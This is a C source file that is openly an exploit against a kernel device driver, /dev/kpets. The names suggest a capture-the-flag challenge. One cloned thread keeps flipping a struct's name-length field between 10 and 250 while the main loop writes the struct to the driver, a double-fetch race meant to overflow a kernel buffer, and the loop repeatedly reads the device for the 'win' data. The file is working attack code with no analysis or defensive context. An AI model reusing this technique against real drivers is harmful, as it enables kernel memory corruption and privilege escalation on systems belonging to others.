#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<errno.h>
#include<fcntl.h>
#include<string.h>
#include<unistd.h>
#include<sys/mman.h>
#include<sched.h>
#include<sched.h>
#include<unistd.h>
#include "pets.h"

static char dragon_type = '\xaa';

struct bad_pet {
    char type;
    unsigned int name_len;
    char name[32];
    unsigned int description_len;
    char description[256];
} s;

void check_win(size_t fd) {
    char buf[64];
    if(read(fd, buf, sizeof(buf))) {
        printf("[*] FOUND!!: %s\n", buf);
        exit(1);
    }
}

int change_len() {
    while(1) {
        s.name_len = 10;
        s.name_len = 250;
    }
    return 0;
}

int main(){
	int ret, fd;
	printf("[*] Starting exploit...\n");
	fd = open("/dev/kpets", O_RDWR);
	if (fd < 0){
	  perror("[!] Failed to open the device.");
	  return errno;
	}

    s.type = 0xc0;
    s.name_len = 10;
    s.description_len = 20;
    memset(&s.name, dragon_type, sizeof(s.name));
    memset(&s.description, dragon_type, sizeof(s.description));
    printf("[*] Mapping child stack...\n");
    void *child_stack = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    child_stack += 0xff0;
    printf("[*] Child stack: %p\n", child_stack);
    printf("[*] Cloning...\n");
    ret = clone(change_len, child_stack, CLONE_VM, 0);
    if(ret == -1) {
        printf("[!] Failed to clone\n");
        return errno;
    }

    printf("[*] Starting write loop...\n");
    size_t i = 0;
    while(1) {
        ret = write(fd, &s, sizeof(s));
        //printf("%d: %d\n", i, ret);
        i++;
        if(i % 1000 == 0) {
            check_win(fd);
        }
    }

	return 0;
}

